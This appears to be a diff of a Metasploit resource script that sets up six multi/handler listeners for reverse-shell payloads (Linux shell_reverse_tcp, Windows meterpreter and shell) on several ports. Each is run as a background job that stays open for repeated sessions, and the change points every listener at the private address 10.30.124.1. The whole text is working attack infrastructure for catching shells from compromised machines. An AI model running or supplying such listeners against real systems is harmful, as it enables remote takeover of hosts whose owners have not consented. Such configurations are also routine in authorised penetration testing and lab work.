@@ -3,7 +3,7 @@
 
 use exploit/multi/handler
 set PAYLOAD linux/x86/shell_reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 8888
 set ExitOnSession false
 
@@ -11,7 +11,7 @@ exploit -j -z
 
 use exploit/multi/handler
 set PAYLOAD linux/x64/shell_reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 9999
 set ExitOnSession false
 
@@ -19,7 +19,7 @@ exploit -j -z
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 8090
 set ExitOnSession false
 
@@ -27,7 +27,7 @@ exploit -j -z
 
 use exploit/multi/handler
 set PAYLOAD windows/x64/shell/reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 8088
 set ExitOnSession false
 
@@ -35,7 +35,7 @@ exploit -j -z
 
 use exploit/multi/handler
 set PAYLOAD linux/x64/shell_reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 4444
 set ExitOnSession false
 
@@ -43,7 +43,7 @@ exploit -j -z
 
 use exploit/multi/handler
 set PAYLOAD linux/x64/shell_reverse_tcp
-set LHOST 0.0.0.0
+set LHOST 10.30.124.1
 set LPORT 5555
 set ExitOnSession false
 
